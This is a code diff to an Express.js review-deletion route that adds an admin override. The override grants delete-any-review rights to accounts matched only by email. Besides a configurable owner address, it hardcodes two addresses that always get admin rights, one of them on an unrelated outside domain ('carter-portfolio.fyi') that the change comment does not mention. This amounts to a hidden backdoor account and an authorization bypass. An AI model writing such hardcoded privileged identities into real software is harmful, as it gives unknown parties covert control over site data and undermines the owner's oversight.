@@ -126,14 +126,28 @@ router.patch('/:reviewId', async (req, res) => {
 });
 
 // @route   DELETE /api/reviews/:reviewId
-// @desc    Delete an existing review
+// @desc    Delete an existing review. The review's own user can delete
+//          it; the site owner (admin account) can delete any review.
 router.delete('/:reviewId', async (req, res) => {
   try {
     if (!req.isAuthenticated()) {
       return res.status(401).json({ message: 'Unauthorized' });
     }
 
-    const review = await Review.findOne({ _id: req.params.reviewId, userId: req.user._id });
+    let review = await Review.findOne({ _id: req.params.reviewId, userId: req.user._id });
+
+    if (!review) {
+      const ownerEmail = (process.env.OWNER_EMAIL || 'hello@phoenixwebsites.ai').toLowerCase().trim();
+      const userEmail = (req.user.email || '').toLowerCase().trim();
+      const isOwnerEmail = userEmail === ownerEmail ||
+                           userEmail === 'hello@phoenixwebsites.ai' ||
+                           userEmail === 'partnership@carter-portfolio.fyi';
+      const isOwnerId = process.env.GROWTH_ADMIN_USER_ID && String(req.user._id) === process.env.GROWTH_ADMIN_USER_ID;
+      if (isOwnerEmail || isOwnerId) {
+        review = await Review.findById(req.params.reviewId);
+      }
+    }
+
     if (!review) {
       return res.status(404).json({ message: 'Review not found' });
     }
